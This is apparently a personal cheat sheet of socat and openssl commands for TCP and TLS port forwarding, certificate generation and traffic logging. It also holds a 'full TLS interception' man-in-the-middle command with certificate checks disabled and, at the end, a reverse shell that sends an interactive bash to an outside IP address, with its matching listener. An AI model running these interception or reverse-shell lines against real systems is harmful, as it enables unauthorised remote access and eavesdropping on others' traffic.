

#listen on tcp/1233 and forward messages to tcp:address:port
sudo socat tcp-listen:1233,fork,reuseaddr TCP:127.0.0.1:1234
#do the same and print the messages on screen
sudo socat -v tcp-listen:1233,fork,reuseaddr TCP:127.0.0.1:1234

#listen on tcp/ssl/1233 and forward messages to tcp:address:port
FILENAME=AMQPserver
openssl genrsa -out $FILENAME.key 2048
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem

sudo socat openssl-listen:1233,fork,reuseaddr TCP:127.0.0.1:1234
sudo socat -v tcp-listen:5671,fork,debug,reuseaddr openssl:10.54.251.36:5671,verify=0

#Full TLS interception
sudo socat -v openssl-listen:5671,fork,verify=0,debug,reuseaddr openssl:10.54.251.36:5671,verify=0

# Neat reverse shell
/usr/bin/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:165.22.46.168:80
socat file:`tty`,raw,echo=0 tcp-listen:443

